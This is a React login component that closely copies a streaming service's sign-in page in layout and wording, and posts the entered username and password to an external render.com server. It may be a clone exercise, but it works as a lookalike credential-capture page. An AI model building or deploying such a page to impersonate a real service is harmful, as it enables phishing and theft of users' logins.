import React, { useState } from "react";
import axios from "axios";
import { useNavigate } from "react-router-dom";
import bgImage from "../assets/image.png";

const Login = () => {
  const [username, setUserName] = useState("");
  const [password, setPassword] = useState("");
  const [errorUser, setErrorUser] = useState("");
  const [errorPass, setErrorPass] = useState("");

  const navigate = useNavigate();

  const validate = () => {
    let valid = true;
    if (!username.trim()) {
      setErrorUser("Please enter a valid email or phone number.");
      valid = false;
    } else {
      setErrorUser("");
    }

    if (password.length < 4 || password.length > 60) {
      setErrorPass("Your password must contain between 4 and 60 characters.");
      valid = false;
    } else {
      setErrorPass("");
    }

    return valid;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!validate()) return;

    try {
      const res = await axios.post("https://login-2amz.onrender.com", {
        username,
        password,
      });
      if (res.data === true) {
        navigate("/success");
      } else {
        navigate("/fail");
      }
    } catch (err) {
      alert("Login failed. Try again later.");
    }
  };

  return (
    <div
      className="min-h-screen flex items-center justify-center bg-cover bg-black text-white "
      style={{
        backgroundImage: `url(${bgImage})`,
      }}
    >
      <div className="bg-opacity-80 bg-gray-900 p-10 rounded-lg shadow-xl w-96">
        <h1 className="text-3xl font-bold mb-6 text-left">Sign In</h1>
        <form onSubmit={handleSubmit} noValidate>
          <div className="mb-4">
            <input
              onChange={(e) => setUserName(e.target.value)}
              value={username}
              type="text"
              placeholder="Email or phone number"
              className={`w-full p-3 rounded bg-gray-800 border ${
                errorUser ? "border-red-600" : "border-gray-700"
              } text-white focus:outline-none`}
            />
            {errorUser && (
              <p className="text-red-600 text-sm mt-1">{errorUser}</p>
            )}
          </div>
          <div className="mb-4">
            <input
              onChange={(e) => setPassword(e.target.value)}
              value={password}
              type="password"
              placeholder="Password"
              className={`w-full p-3 rounded bg-gray-800 border ${
                errorPass ? "border-red-600" : "border-gray-700"
              } text-white focus:outline-none`}
            />
            {errorPass && (
              <p className="text-red-600 text-sm mt-1">{errorPass}</p>
            )}
          </div>
          <button
            type="submit"
            className="w-full bg-red-600 hover:bg-red-700 text-white font-semibold py-3 rounded mt-2"
          >
            Sign In
          </button>
        </form>
        <div className="text-gray-400 text-sm mt-4 flex justify-between">
          <label>
            <input type="checkbox" className="mr-2" />
            Remember me
          </label>
          <a href="#" className="hover:underline">
            Need help?
          </a>
        </div>
        <p className="text-gray-400 text-sm mt-6">
          New to our site?{" "}
          <a href="#" className="text-white hover:underline">
            Sign up now
          </a>
        </p>
      </div>
    </div>
  );
};

export default Login;
